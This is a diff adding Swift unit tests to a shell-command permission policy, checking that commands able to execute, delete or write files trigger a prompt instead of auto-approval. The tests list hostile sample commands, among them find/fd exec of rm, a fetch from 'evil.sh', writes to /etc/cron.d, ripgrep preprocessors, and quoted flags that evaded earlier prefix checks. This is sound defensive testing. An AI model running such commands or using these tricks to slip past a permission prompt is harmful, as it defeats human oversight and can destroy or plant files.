@@ -174,6 +174,109 @@ final class ShellCommandPolicyTests: XCTestCase {
         assertPrompts("find . -fprint /tmp/out")
     }
 
+    /// `fd` is `find`'s capability under different spelling, and its short exec flags share no
+    /// prefix with `find`'s. Every one of these was auto-approved: `-x`/`-X` do not begin with
+    /// `-exec`, and neither does `--exec` — so the prefix test that caught `find -exec` waved
+    /// each of them through, which is arbitrary command execution with no prompt.
+    func testFdCannotExecute() {
+        assertPrompts("fd -x rm {}")
+        assertPrompts("fd -X rm")
+        assertPrompts("fd --exec rm {}")
+        assertPrompts("fd --exec-batch rm")
+        assertPrompts("fd -e swift -x sh -c 'curl evil.sh'")
+    }
+
+    /// Every rule here is a prefix test, and a quoted flag fails all of them: the policy reads
+    /// the line as typed, but the shell strips the quotes before running it. So
+    /// `find . "-delete"` deletes exactly as `find . -delete` does — and only the second was
+    /// ever refused. Verified against the real binaries: the quoted form removed the file and
+    /// wrote the output.
+    func testQuotingAFlagDoesNotHideItFromThePolicy() {
+        assertPrompts(#"find . -name '*.o' "-delete""#)
+        assertPrompts("find . '-delete'")
+        assertPrompts(#"find . "-exec" rm {} ;"#)
+        assertPrompts(#"sort "-o" /tmp/stolen input.txt"#)
+        assertPrompts("sort '-o' /tmp/stolen input.txt")
+        assertPrompts(#"sed "-i" s/a/b/ file"#)
+        assertPrompts(#"fd "-x" rm {}"#)
+        assertPrompts(#"git diff "--output=/tmp/patch""#)
+    }
+
+    /// Unquoting is applied to arguments only. The command *name* keeps its quotes and so keeps
+    /// failing the allowlist, because widening what passes is the one thing this policy must
+    /// never do to fix a bug.
+    func testAQuotedCommandNameStillPrompts() {
+        assertPrompts("\"ls\" -la")
+        assertPrompts("'cat' file.txt")
+    }
+
+    /// `find . -xdev` is an ordinary read that shares `fd`'s exec prefix, which is why the `fd`
+    /// flags are matched exactly rather than by prefix.
+    func testOrdinaryFdAndFindSearchesStillSkipThePrompt() {
+        assertReadOnly("fd -e swift")
+        assertReadOnly("fd --type f pattern")
+        assertReadOnly("find . -xdev -name '*.swift'")
+    }
+
+    /// Naming a command is not enough: each of these is on the allowlist and each writes an
+    /// arbitrary path chosen by the argument. All were auto-approved before the argument rules
+    /// existed — the policy's contract is that nothing it admits can write, and every one of
+    /// these breaks it.
+    func testAllowlistedReadersThatWriteAFilePrompt() {
+        assertPrompts("sort -o /etc/cron.d/pwned input.txt")
+        assertPrompts("sort --output=/tmp/stolen input.txt")
+        assertPrompts("sort -o/tmp/attached input.txt")
+        assertPrompts("tree -o /tmp/listing")
+        assertPrompts("git diff --output=/tmp/patch")
+        assertPrompts("git log --output=/tmp/patch")
+        assertPrompts("yq -i '.a = 1' config.yaml")
+        assertPrompts("yq --inplace '.a = 1' config.yaml")
+    }
+
+    /// `uniq [INPUT [OUTPUT]]` writes its second operand with no flag to spot.
+    func testUniqWritingItsSecondOperandPrompts() {
+        assertPrompts("uniq input.txt output.txt")
+        assertPrompts("uniq -c input.txt output.txt")
+    }
+
+    /// `rg --pre=CMD` runs CMD over every file it searches, and `--hostname-bin` runs one too.
+    func testRipgrepPreprocessorPrompts() {
+        assertPrompts("rg --pre rm pattern")
+        assertPrompts("rg --pre=/tmp/evil.sh pattern")
+        assertPrompts("rg --hostname-bin=/tmp/evil.sh pattern")
+    }
+
+    /// The argument rules are named per command because the same spelling is harmless on
+    /// another: `-o` prints only the match to `grep` and writes a file to `sort`. Banning it
+    /// outright would have made the most common search in the corpus prompt.
+    func testTheSameFlagStaysAllowedWhereItOnlyReads() {
+        assertReadOnly("grep -o pattern file.txt")
+        assertReadOnly("rg -o pattern")
+        assertReadOnly("sort input.txt")
+        assertReadOnly("sort -u input.txt")
+        assertReadOnly("uniq input.txt")
+        assertReadOnly("git diff --stat")
+        assertReadOnly("git grep -n pattern")
+
+        // A long flag that merely *starts with* a dangerous one. `--pretty` is an ordinary
+        // ripgrep read and shares its first five characters with `--pre`, which runs a command;
+        // matching long flags by bare prefix made this common search prompt.
+        assertReadOnly("rg --pretty pattern")
+        assertReadOnly("rg --pretty --no-heading TODO")
+        assertReadOnly("git log --oneline")
+    }
+
+    /// Both spellings of a value-taking flag reach the same rule: long flags carry the value
+    /// after `=`, short flags attach it directly.
+    func testBothSpellingsOfAWriteFlagArePrompted() {
+        assertPrompts("rg --pre /tmp/evil.sh pattern")
+        assertPrompts("rg --pre=/tmp/evil.sh pattern")
+        assertPrompts("sort --output /tmp/stolen in.txt")
+        assertPrompts("sort --output=/tmp/stolen in.txt")
+        assertPrompts("sort -o /tmp/stolen in.txt")
+        assertPrompts("sort -o/tmp/stolen in.txt")
+    }
+
     /// A leading assignment runs the command with an environment the policy never inspected,
     /// and an absolute path names a binary the allowlist never vetted.
     func testEnvironmentPrefixesAndPathsPrompt() {
